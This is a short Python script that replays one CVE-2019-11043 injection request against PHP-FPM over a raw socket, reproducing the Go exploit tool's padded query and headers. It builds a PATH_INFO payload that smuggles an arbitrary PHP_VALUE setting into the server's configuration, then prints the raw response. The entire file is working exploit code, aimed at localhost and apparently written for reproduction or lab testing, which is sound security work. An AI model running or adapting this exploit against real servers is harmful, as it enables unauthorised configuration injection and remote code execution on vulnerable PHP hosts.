#!/usr/bin/env python3
"""Raw-socket replay of one CVE-2019-11043 injection request (Go requester-compatible).

usage: replay.py <port> <setting> <qsl> <pisos> [query-prefix]
Prints the exact request line (truncated) and the raw response head.
"""
import socket, sys, urllib.parse

port = int(sys.argv[1]); setting = sys.argv[2]
qsl = int(sys.argv[3]); pisos = int(sys.argv[4])
prefix = sys.argv[5] if len(sys.argv) > 5 else ""

POS = 34
pi = "/PHP_VALUE\n" + setting
assert len(pi) <= POS, "setting too long for PosOffset=34"
pi += ";" * (POS - len(pi))

def esc(s):
    return urllib.parse.quote(s, safe="/;=")

base = "/index.php"
esc_base = esc(base)
esc_full = esc_base + esc(pi)
delta = len(esc_full) - len(pi) - len(esc_base)      # Go: len(EscapedPath) - len(pathInfo) - len(base EscapedPath)
qlen = qsl - delta // 2 - len(prefix)
assert qlen > 0
uri = esc_full + "?" + prefix + "Q" * qlen

req = (f"GET {uri} HTTP/1.1\r\n"
       f"Host: 127.0.0.1:{port}\r\n"
       f"User-Agent: Mozilla/5.0\r\n"
       f"D-Pisos: 8{'=' * pisos}D\r\n"
       f"Ebut: mamku tvoyu\r\n"
       f"Connection: close\r\n\r\n")

print(f"# PathInfo payload : {pi!r}")
print(f"# query length    : {qlen}  (qsl={qsl}, delta={delta})")
print(f"# request line    : {uri[:160]}...({len(uri)} bytes)")
s = socket.create_connection(("127.0.0.1", port), timeout=10)
s.sendall(req.encode())
data = b""
while True:
    b = s.recv(65536)
    if not b:
        break
    data += b
head, _, body = data.partition(b"\r\n\r\n")
print("# --- raw response head ---")
print(head.decode("latin1"))
print("# body[:200]:", body[:200].decode("latin1").replace("\n", " | "))
print("# SET-COOKIE PRESENT:", b"Set-Cookie" in head or b"set-cookie" in head)
